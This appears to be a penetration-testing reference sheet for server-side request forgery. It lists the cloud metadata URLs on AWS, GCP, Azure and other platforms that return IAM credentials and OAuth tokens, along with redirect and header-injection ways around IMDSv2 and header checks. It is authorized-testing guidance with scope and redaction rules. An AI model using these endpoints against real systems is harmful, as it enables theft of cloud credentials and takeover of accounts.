# Cloud metadata endpoints (step 2)
# Reach these THROUGH the SSRF sink (server-side). Stay in scope + approval-gated. Store any creds REDACTED.

## AWS (IMDS)
```
# IMDSv1 (no token):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/            # -> role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>      # -> AccessKeyId/Secret/Token
# IMDSv2 (token required) — needs a PUT the sink usually can't do:
PUT http://169.254.169.254/latest/api/token   (header: X-aws-ec2-metadata-token-ttl-seconds: 21600)
# bypass helpers: redirect to 169.254.169.254; alt IPs (http://[fd00:ec2::254]/ IPv6)
```

## GCP
```
http://metadata.google.internal/computeMetadata/v1/   (header REQUIRED: Metadata-Flavor: Google)
.../instance/service-accounts/default/token           # -> OAuth token
# header-injection needed if the sink can't set Metadata-Flavor
```

## Azure (IMDS)
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01   (header: Metadata: true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

## Others
```
DigitalOcean:  http://169.254.169.254/metadata/v1/
Alibaba:       http://100.100.100.200/latest/meta-data/
Oracle OCI:    http://169.254.169.254/opc/v1/instance/
Kubernetes:    file:///var/run/secrets/kubernetes.io/serviceaccount/token   (via file:// or container SSRF)
```

## Notes
- Many sinks need a **header-injection** or **redirect** to satisfy GCP/Azure/IMDSv2 requirements —
  note whether the sink can meet them (feeds the verify.md IMDS-version check).
- Reaching metadata but getting IMDSv2-blocked is still a finding (SSRF to link-local) — just not
  credential disclosure. Rate honestly.
